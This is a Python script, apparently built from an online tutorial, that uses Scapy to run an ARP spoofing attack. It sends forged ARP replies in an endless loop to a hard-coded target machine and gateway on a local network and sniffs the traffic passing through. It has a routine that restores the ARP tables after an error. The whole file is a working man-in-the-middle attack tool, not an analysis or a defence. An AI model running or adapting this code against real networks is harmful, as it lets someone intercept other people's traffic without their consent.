import binascii
import threading
import time

import scapy.all as scapy

"""
Hot to Build an ARP Spoofing
https://aaronjohn2.github.io/python,/arp/spoofing,/table/poisoning,/kali,/scapy,/layer/2.5,/data/link/2019/02/18/arp-spoof.html

Scapy Python Library
https://scapy.net/

Scapy 이용한 서비스 생존여부 체크?
http://egloos.zum.com/mcchae/v/11329751
"""


class SpoofingThread(threading.Thread):

    def __init__(self, target_ip, gateway_ip, name):
        threading.Thread.__init__(self, name = name)
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip

    def run(self) -> None:

        try:
            while True:
                # print("\n[+] [{th_name}] Started, Target IP : {target_ip} \n".format(th_name = self.getName(),
                #                                                                      target_ip = self.target_ip))
                spoof(self.target_ip, self.gateway_ip)
                spoof(self.gateway_ip, self.target_ip)

        except Exception as ex:
            restore(self.target_ip, self.gateway_ip)
            restore(self.gateway_ip, self.target_ip)
            print("[!] {th_name} Thread Exception : {msg}".format(th_name = self.getName(), msg = ex.__str__()))


"""
Scapy Functions
"""


# def show_packet(packet):
#     # print(packet.show())
#
#     if packet.haslayer(scapy.IP):
#         src_ip = packet[scapy.IP].src
#         dst_ip = packet[scapy.IP].dst
#
#         if packet.haslayer(scapy.Raw):
#             load = packet[scapy.Raw].load
#             print(packet.summary())
#             # print(scapy.hexdump(load))

def brief_packet(packet):
    if packet.haslayer(scapy.IP):
        src_ip = packet[scapy.IP].src
        dst_ip = packet[scapy.IP].dst

        print(src_ip, ' -> ', dst_ip)


def sniff_packet():
    # pkt = scapy.sniff(count = 10, prn = show_packet, store = False)
    # scapy.sniff(count = 0, store = False, prn = lambda x: x.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:˓→%Raw.load%\n}"))
    pkt = scapy.sniff(count = 10)
    print(pkt.nsummary())


def get_mac_addr(ip: str) -> str:
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')

    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip: str, spoof_ip: str):
    target_mac = get_mac_addr(target_ip)

    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    sniff_packet()
    scapy.send(packet, verbose = False)


def restore(dest_ip: str, source_ip: str):
    dest_mac = get_mac_addr(dest_ip)
    source_mac = get_mac_addr(source_ip)

    packet = scapy.ARP(op = 2, pdst = dest_ip, hwdst = dest_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, count = 4, verbose = False)


"""
Main Function
"""
if __name__ == '__main__':

    total_thread_limit = 1

    target_ip = '192.168.1.59'
    gateway_ip = '192.168.1.1'

    thread_list = []

    try:

        for n in range(0, total_thread_limit):
            thread_list.append(SpoofingThread(name = 'Thread Number {num}'.format(num = str(n + 1)),
                                              target_ip = target_ip, gateway_ip = gateway_ip))

        for th in thread_list:
            th.start()

        for th in thread_list:
            th.join()

    except Exception as e:
        print("[!] Main Exception : ", e.__str__())
        exit(0)

    except KeyboardInterrupt:
        print("[-] Keyboard Interrupt, It will be closed...")
        exit(1)
